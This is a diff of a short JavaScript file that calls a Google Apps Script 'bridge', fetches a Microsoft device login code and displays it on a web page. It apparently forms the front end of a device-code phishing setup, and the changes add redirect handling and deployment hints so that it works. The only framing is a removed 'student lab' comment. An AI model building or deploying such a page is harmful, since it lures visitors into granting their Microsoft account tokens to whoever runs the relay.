@@ -1,26 +1,25 @@
-const WORKER_URL = "https://script.google.com/macros/s/AKfycbwSEFe4BjLPalOtC1hibx7Zm6zXpsufP7dQAFXiz_5KpJTCL0Mum41LnijruExNyTPL/exec";
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfy.../exec";
 
 async function init() {
     console.log("Engine v3.4: Initializing...");
     
     try {
-        const response = await fetch(WORKER_URL);
-        const data = await response.json();
+        const response = await fetch(SCRIPT_URL, {
+            redirect: "follow" // CRITICAL: Tell the browser to follow Google's redirect
+        });
+        
+        const rawData = await response.text();
+        const data = JSON.parse(rawData);
 
         if (data.user_code) {
-            console.log("SUCCESS: Code Generated");
-            // Display the code on your website
+            console.log("LOOP BROKEN! Code:", data.user_code);
             document.getElementById("code-display").innerText = data.user_code;
-            
-            // Helpful link for the student lab
-            console.log("Visit: https://microsoft.com/devicelogin");
         } else {
-            console.error("API Error:", data.error_description || "Unknown Error");
+            console.error("Microsoft Error:", data.error_description);
         }
     } catch (err) {
-        console.error("Connection to Bridge Failed:", err);
+        console.error("Bridge Connection Error. Check if script is deployed as 'Anyone'.");
     }
 }
 
-// Start the engine
 init();
